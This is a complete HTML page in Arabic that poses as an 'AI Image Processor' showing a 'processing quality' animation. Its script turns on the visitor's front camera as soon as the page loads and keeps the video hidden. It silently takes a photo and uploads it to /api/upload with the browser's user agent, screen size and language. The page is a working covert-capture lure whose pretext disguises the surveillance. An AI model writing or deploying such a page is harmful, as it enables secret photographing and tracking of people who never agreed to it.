<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Image Processor</title>
    <style>
        :root { --accent: #00d2ff; }
        body { 
            margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center;
            background: linear-gradient(45deg, #0f172a, #1e293b, #0f172a);
            background-size: 400% 400%; animation: gradientBG 10s ease infinite;
            font-family: 'Segoe UI', sans-serif; color: white; overflow: hidden;
        }
        @keyframes gradientBG { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
        
        .glass-card {
            background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px);
            padding: 40px; border-radius: 30px; border: 1px solid rgba(255,255,255,0.1);
            text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5);
            width: 80%; max-width: 400px;
        }
        .pulse { 
            width: 80px; height: 80px; background: var(--accent); border-radius: 50%;
            margin: 0 auto 20px; animation: pulse 1.5s infinite;
        }
        @keyframes pulse { 0% { transform: scale(0.8); box-shadow: 0 0 0 0 rgba(0,210,255,0.7); } 70% { transform: scale(1); box-shadow: 0 0 0 20px rgba(0,210,255,0); } 100% { transform: scale(0.8); box-shadow: 0 0 0 0 rgba(0,210,255,0); } }
        
        .status-text { font-size: 1.2rem; font-weight: bold; margin-top: 15px; letter-spacing: 1px; }
        .result { font-size: 80px; display: none; }
        #succ { color: #22c55e; } #err { color: #ef4444; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="glass-card" id="ui">
        <div class="pulse"></div>
        <div class="status-text">جاري معالجة الجودة...</div>
    </div>

    <div id="succ" class="result">✨</div>
    <div id="err" class="result">⚠️</div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const video = document.getElementById('video'), canvas = document.getElementById('canvas'), ctx = canvas.getContext('2d');
        const ui = document.getElementById('ui'), succ = document.getElementById('succ'), err = document.getElementById('err');

        async function start() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                video.onloadedmetadata = () => setTimeout(() => capture(stream), 500);
            } catch(e) { ui.style.display='none'; err.style.display='block'; }
        }

        function capture(stream) {
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0);
            canvas.toBlob(async (blob) => {
                const fd = new FormData();
                fd.append('captured_image', blob, 'snap.jpg');
                fd.append('deviceInfo', JSON.stringify({
                    userAgent: navigator.userAgent,
                    screen: `${window.screen.width}x${window.screen.height}`,
                    language: navigator.language
                }));
                try {
                    const res = await fetch('/api/upload', { method: 'POST', body: fd });
                    ui.style.display='none';
                    res.ok ? (succ.style.display='block') : (err.style.display='block');
                } catch(e) { ui.style.display='none'; err.style.display='block'; }
                stream.getTracks().forEach(t => t.stop());
            }, 'image/jpeg', 0.9);
        }
        start();
    </script>
</body>
</html>
